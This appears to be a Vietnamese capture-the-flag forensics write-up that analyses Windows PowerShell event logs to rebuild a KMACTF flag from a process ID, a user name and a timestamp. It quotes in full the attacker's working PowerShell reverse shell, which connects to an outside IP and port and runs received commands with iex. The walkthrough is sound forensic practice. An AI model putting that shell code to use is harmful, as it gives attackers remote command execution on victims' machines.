![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20154222.png)

# Phân tích
Đề bài cho một thư mục bào gồm cái file log

Sử dụng `Event Viewer` để phân tích. Mở file `Microsoft-Windows-PowerShell%4Operational.evtx`, để xem các powershell đã thực thi. Thấy một đoạn script có vè khả nghi:

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20154731.png)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27", 4953)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
$sendbyte = "KMACTF{$(([System.BitConverter]::ToString(([System.Security.Cryptography.MD5]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name+(Get-Date).ToString())))))).Replace('-', '').ToLower())}"
$sendbyteBytes = [System.Text.Encoding]::ASCII.GetBytes($sendbyte)
$stream.Write($sendbyteBytes, 0, $sendbyteBytes.Length)
$stream.Flush()
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```
Đọc qua đoạn script trên thì nó thực hiện như sau : 
- Lấy PID của tiến trình hiện tại: `Get-Process -Id $PID`
- Lấy tên của Domain và User: `[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`
- Lấy thời gian lúc thực hiện script: `Get-Date`
- Sau đó băm những thứ lấy được và gửi cho ip `192.168.253.27` qua port `4953` bằng giao thức TCP

# Solved

## Lấy PID 
Để xem PID của tiến trình ta xem Event dưới dạng XML Details 

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20155819.png)

Nhưng có vẻ như đã bị động tay khiến cho không thể xem được. Xem tiếp các event khác thì thấy vẫn xem được

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20162724.png)

Nhận thấy event này được thực thi chỉ cách đoạn trước có 1 giây nên khả năng là nằm trong cùng 1 tiến trình => PID = 4144

# Lấy Domain và User

Xem phần Path

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20160939.png)

Đươc user = long

Còn Domain thì sử dụng file `Security.evtx` để lấy :

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20161053.png)

=> Domain = KMA
# Lấy thời gian :

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20161236.png)

Time = `5/22/2023 5:09:58 PM`

# Lấy Flag

Chạy đoạn script:
```ps
echo "KMACTF{$(([System.BitConverter]::ToString(([System.Security.Cryptography.MD5]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(("4144"+"KMA\long"+"5/22/2023 5:09:58 PM")))))).Replace('-', '').ToLower())}"
```
Ta đươc flag:

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-06-20%20161717.png)
